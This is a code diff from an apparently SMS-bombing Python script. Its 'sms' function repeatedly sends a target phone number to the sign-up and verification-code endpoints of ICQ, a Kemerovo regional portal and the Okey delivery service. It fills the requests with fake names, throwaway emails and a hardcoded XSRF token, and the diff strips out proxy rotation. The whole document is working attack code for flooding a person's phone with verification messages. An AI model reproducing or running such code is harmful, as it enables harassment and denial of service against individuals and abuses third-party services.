@@ -1999,11 +1999,12 @@ def sms(prx, number, tm, code):
 			t = time.monotonic()
 
 			while time.monotonic() - t < tm:
-				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
+				user = get_user()
+
 				try:
 					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
 					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
-					requests.post(url, json = params, headers = header, proxies = proxies)
+					requests.post(url, json = params, headers = header)
 				except:
 					pass
 
@@ -2374,7 +2375,7 @@ def sms(prx, number, tm, code):
 						"X-XSRF-TOKEN": "eyJpdiI6InlTY2tvVUtvV1pRWW83NHViUEZIYnc9PSIsInZhbHVlIjoibUhqdjU4ZUVXNGlxRjFFcVwvZWw4RkJMSHp6WTRnSzhudUZ4NGxMbGxmbEpEUDcxNFN1RW5TNnozZjVwVkZ3S29CK3NIRGhaTE1NMGlUdGlqVUpHYVRVOXB0cEpXWk1COXIxdEtuYTNyUnRBS2JFbnpraE5sdkJZeUJNUXZLMkVqIiwibWFjIjoiNGRmNGI5OTViZDFmZmFkYTIyZDQzYmQ0YzYzOWQyMWJlMzAxY2Q3OGVkMWEzMzA5MDA0NDk5NjhkYzBkODg0NCJ9"
 					}
 					payload = {"phone":number,"firstName":"Вася","lastName":"Пупкин","email":"wegrfrsfrdihkljn@hotmail.com","city":{"id":4,"name":"г. Анжеро-Судженск (Анжеро-Судженский городской округ)","is_active":True,"order":20,"domain":"anzhero-sudzhensk","guid":"8a5314a4-903e-475c-a4db-8f03db3b793f"}}
-					requests.post("https://kemerovo.kuzbass-online.ru/web/v1/auth/start", json=payload, headers=header, proxies = proxies)
+					requests.post("https://kemerovo.kuzbass-online.ru/web/v1/auth/start", json=payload, headers=header)
 				except:
 					pass
 
@@ -2405,7 +2406,7 @@ def sms(prx, number, tm, code):
 					}
 
 					payload = {"profile":{"firstName":"Вася","lastName":"Пупкин","email":"erijniojnjklbgnfiljk@hotmail.com","phone":{number},"birthday":"2000-12-12","middleName":"Васильков","genderCode":"1","password":"rthndytwsgrhdbsd","allowPersonalDataProcessing":"true","allowEmail":"false","allowSms":"false","allowEReciept":"false"}}
-					requests.post("https://www.okeydostavka.ru/wcs/resources/mobihub023/store/13159/loyalty/profile/profile", json=payload, headers=header, proxies = proxies)
+					requests.post("https://www.okeydostavka.ru/wcs/resources/mobihub023/store/13159/loyalty/profile/profile", json=payload, headers=header)
 				except:
 					pass
 
